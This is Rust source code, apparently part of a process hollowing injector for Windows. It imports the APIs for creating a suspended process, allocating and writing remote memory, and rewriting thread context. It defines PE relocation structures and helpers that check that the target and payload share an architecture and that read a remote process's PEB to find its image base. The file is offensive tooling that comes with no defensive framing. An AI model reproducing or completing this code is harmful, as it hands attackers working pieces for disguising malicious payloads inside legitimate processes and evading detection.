use std::ffi::CString;
#[allow(non_snake_case)]
#[allow(non_camel_case_types)]
use std::fs::File;
use std::io::prelude::*;
use std::mem::{size_of, size_of_val, zeroed};
use std::ptr::null_mut;

use anyhow::*;
use bitfield;
use ntapi::{
    ntpebteb::{PEB, PPEB},
    ntpsapi::{NtQueryInformationProcess, PROCESS_BASIC_INFORMATION},
};
use winapi::ctypes::c_void;
use winapi::shared::{
    basetsd::DWORD64,
    minwindef::{DWORD, LPCVOID, PUCHAR, UCHAR},
    ntdef::{BOOLEAN, HANDLE, PVOID, ULONG},
};
use winapi::um::{
    errhandlingapi::GetLastError,
    memoryapi::{ReadProcessMemory, VirtualAlloc, VirtualAllocEx, VirtualFree, WriteProcessMemory},
    processthreadsapi::{
        CreateProcessA,
        GetThreadContext,
        ResumeThread,
        SetThreadContext, // SuspendThread
        PROCESS_INFORMATION,
        STARTUPINFOA,
    },
    winbase::{Wow64GetThreadContext, Wow64SetThreadContext, CREATE_SUSPENDED},
    winnt::{
        CONTEXT, CONTEXT_FULL, IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_IMPORT,
        IMAGE_DOS_HEADER, IMAGE_IMPORT_DESCRIPTOR, IMAGE_NT_HEADERS, IMAGE_NT_HEADERS32,
        IMAGE_NT_HEADERS64, IMAGE_ORDINAL32, IMAGE_ORDINAL64, IMAGE_REL_BASED_DIR64,
        IMAGE_REL_BASED_HIGH, IMAGE_REL_BASED_HIGHLOW, IMAGE_REL_BASED_LOW, IMAGE_SECTION_HEADER,
        IMAGE_SNAP_BY_ORDINAL32, IMAGE_SNAP_BY_ORDINAL64, IMAGE_THUNK_DATA32, IMAGE_THUNK_DATA64,
        LIST_ENTRY, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PIMAGE_NT_HEADERS32,
        PIMAGE_NT_HEADERS64, PIMAGE_SECTION_HEADER, PSTR, WOW64_CONTEXT, WOW64_CONTEXT_FULL,
    },
};

pub fn get_binary_from_file(file_name: impl Into<String>) -> Result<Vec<u8>> {
    let file_name = file_name.into();
    let mut f = File::open(&file_name)
        .with_context(|| format!("could not opening the file: {}", &file_name))?;
    let mut buffer = Vec::new();
    f.read_to_end(&mut buffer)
        .with_context(|| format!("could not reading from the file: {}", &file_name))?;
    Ok(buffer)
}

#[derive(Debug, PartialEq)]
pub enum X96 {
    X86,
    X64,
    Unknown,
}

#[repr(C)]
pub struct BASE_RELOCATION_BLOCK {
    pub PageAddress: u32,
    pub BlockSize: u32,
}

bitfield! {
    pub struct BASE_RELOCATION_ENTRY([u8]);
    impl Debug;
    u8;
    pub u16, offset, _: 11, 0;
    pub u8, block_type, _: 15, 12;
}

pub struct Delta {
    pub is_minus: bool,
    pub offset: usize,
}

impl Delta {
    pub fn calculate_delta(target: usize, src: usize) -> Delta {
        let is_minus = target < src;
    
        if is_minus {
            Delta {
                is_minus,
                offset: src - target,
            }
        } else {
            Delta {
                is_minus,
                offset: target - src,
            }
        }
    }
}

// ".reloc" binary
pub const DOT_RELOC: [u8; 8] = [46, 114, 101, 108, 111, 99, 0, 0];

pub unsafe fn x96_check<T>(buffer: *mut T) -> X96 {
    let dos_header = std::ptr::read::<IMAGE_DOS_HEADER>(buffer as *mut _);
    let p_buffer = buffer as usize + dos_header.e_lfanew as usize;
    let nt_header = std::ptr::read::<IMAGE_NT_HEADERS>(p_buffer as *mut _);

    match nt_header.FileHeader.Machine {
        0x014C => X96::X86,
        0x8664 => X96::X64,
        _ => X96::Unknown,
    }
}

pub unsafe fn check_same_architecture(target: *mut c_void, src: *mut c_void) -> Result<()> {
    let t = x96_check(target);
    let s = x96_check(src);

    if t == X96::Unknown {
        bail!("Error. target is unsupported architecture.")
    }

    if s == X96::Unknown {
        bail!("Error. payload is unsupported architecture.")
    }

    if t != s {
        bail!("target and payload must have the same architecture.")
    }

    Ok(())
}

pub unsafe fn get_remote_image_base_address(h_process: HANDLE) -> Result<*mut c_void> {
    let mut pbi = zeroed::<PROCESS_BASIC_INFORMATION>();
    let mut peb = zeroed::<PEB>();

    NtQueryInformationProcess(
        h_process,
        0,
        &mut pbi as *const _ as *mut _,
        size_of_val(&pbi) as u32,
        null_mut(),
    );

    let peb_address = pbi.PebBaseAddress;

    if ReadProcessMemory(
        h_process,
        peb_address as *mut c_void,
        &mut peb as *const _ as *mut _,
        size_of::<PEB>(),
        null_mut(),
    ) == 1
    {
        Ok(peb.ImageBaseAddress)
    } else {
        bail!("Error. could not get image address.")
    }
}
